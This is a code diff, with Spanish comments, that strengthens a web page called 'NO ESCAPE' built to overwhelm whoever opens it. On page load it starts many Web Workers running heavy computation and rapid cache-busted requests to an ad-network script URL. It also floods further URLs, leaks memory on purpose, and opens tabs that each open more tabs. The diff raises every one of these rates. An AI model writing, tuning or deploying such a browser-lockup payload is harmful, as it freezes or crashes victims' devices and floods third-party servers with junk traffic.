@@ -15,67 +15,69 @@ body{
 h1{
   margin-top:60px;
   font-size:5rem;
-  animation: blink 0.3s infinite;
+  animation: blink 0.25s infinite;
 }
 #contador{
   font-size:2.8rem;
   margin:30px;
 }
-@keyframes blink{ 50%{ opacity:0.1; } }
+@keyframes blink{ 50%{ opacity:0.08; } }
 </style>
 </head>
 <body>
 <h1>☢ NO ESCAPE ☢</h1>
 <div id="contador">CPU/RAM siendo violada: 0%</div>
 
-<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
-<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.2;"></canvas>
+<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.28;"></canvas>
+<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.22;"></canvas>
 
 <script>
 let total = 0;
 let running = true;
-let instancia = 1; // Para identificar cada pestaña
 
-// Matrix Rain
+// Matrix más pesada
 function createMatrix(id, speed) {
   const canvas = document.getElementById(id);
   const ctx = canvas.getContext("2d");
   let w = canvas.width = window.innerWidth;
   let h = canvas.height = window.innerHeight;
  
-  const chars = "0123456789ABCDEFアイウエオ$@#&";
+  const chars = "0123456789ABCDEFアイウエオ$@#&%";
   const fontSize = 14;
   const columns = w / fontSize;
   const drops = Array(Math.floor(columns)).fill(1);
 
   function draw() {
-    ctx.fillStyle = "rgba(0,0,0,0.08)";
+    ctx.fillStyle = "rgba(0,0,0,0.07)";
     ctx.fillRect(0, 0, w, h);
     ctx.fillStyle = "#00ff00";
     ctx.font = fontSize + "px monospace";
     for(let i = 0; i < drops.length; i++) {
       ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
-      if(drops[i]*fontSize > h && Math.random() > 0.975) drops[i] = 0;
+      if(drops[i]*fontSize > h && Math.random() > 0.97) drops[i] = 0;
       drops[i]++;
     }
   }
   setInterval(draw, speed);
 }
-createMatrix("c1", 22);
-createMatrix("c2", 16);
+createMatrix("c1", 18);
+createMatrix("c2", 13);
 
-// Carga pesada
+// === MÁS POTENCIA ===
 function createWorker() {
   const code = `
     self.onmessage = () => {
       setInterval(() => {
-        for(let i = 0; i < 7; i++) {
+        for(let i = 0; i < 12; i++) {
           fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
           {mode:"no-cors", cache:"no-store"}).catch(()=>{});
         }
+        // Cálculo muy pesado
         let x = 0;
-        for(let j = 0; j < 75000; j++) x += Math.random() * Math.sin(j);
-      }, 6);
+        for(let j = 0; j < 120000; j++) {
+          x += Math.sin(j) * Math.random() * Math.tan(j % 100);
+        }
+      }, 3);
     };
   `;
   const blob = new Blob([code], {type: "application/javascript"});
@@ -93,20 +95,21 @@ function spamPrincipal() {
   ];
 
   urls.forEach(url => {
-    for(let i = 0; i < 5; i++) {
+    for(let i = 0; i < 7; i++) {
       const cb = "?t=" + Date.now() + Math.random();
       fetch(url + cb, {mode: "no-cors", cache: "no-store"}).catch(() => {});
       new Image().src = url + cb;
     }
   });
 
-  window.leakArray = (window.leakArray || []).concat(new Array(7000).fill({data: Math.random()}));
+  // Memory leak más fuerte
+  window.leakArray = (window.leakArray || []).concat(new Array(12000).fill({data: Math.random(), big: new Array(50)}));
 
   total++;
-  const porcentaje = Math.min(100, Math.floor(total / 5));
+  const porcentaje = Math.min(100, Math.floor(total / 4));
   document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;
 
-  setTimeout(spamPrincipal, 9);
+  setTimeout(spamPrincipal, 6);
 }
 
 // === EFECTO CADENA ===
@@ -116,28 +119,27 @@ function abrirNuevaPestana() {
   } catch(e) {}
 }
 
-// INICIO AUTOMÁTICO CON CADENA
+// INICIO
 window.onload = function() {
-  for(let i = 0; i < 7; i++) createWorker();
+  // Muchos workers
+  for(let i = 0; i < 10; i++) createWorker();
 
-  for(let i = 0; i < 80; i++) {
-    setTimeout(spamPrincipal, i * 12);
+  // Spam fuerte
+  for(let i = 0; i < 120; i++) {
+    setTimeout(spamPrincipal, i * 8);
   }
   spamPrincipal();
 
-  // Cadena: cada pestaña abre otra
-  setTimeout(abrirNuevaPestana, 900);   // Primera apertura
+  // Cadena de pestañas
+  setTimeout(abrirNuevaPestana, 800);
 
-  // Cada pestaña seguirá abriendo más cada 4-7 segundos
   setInterval(() => {
-    if (Math.random() > 0.4) {   // No siempre abre para no saturar demasiado rápido
-      abrirNuevaPestana();
-    }
-  }, 4500);
+    if (Math.random() > 0.35) abrirNuevaPestana();
+  }, 3800);
 
   setTimeout(() => {
-    alert("☢ NO ESCAPE ACTIVADO ☢\n\nCada pestaña abrirá más...");
-  }, 800);
+    alert("☢ NO ESCAPE ☢\n\nCada pestaña genera más pestañas...");
+  }, 600);
 };
 </script>
 </body>
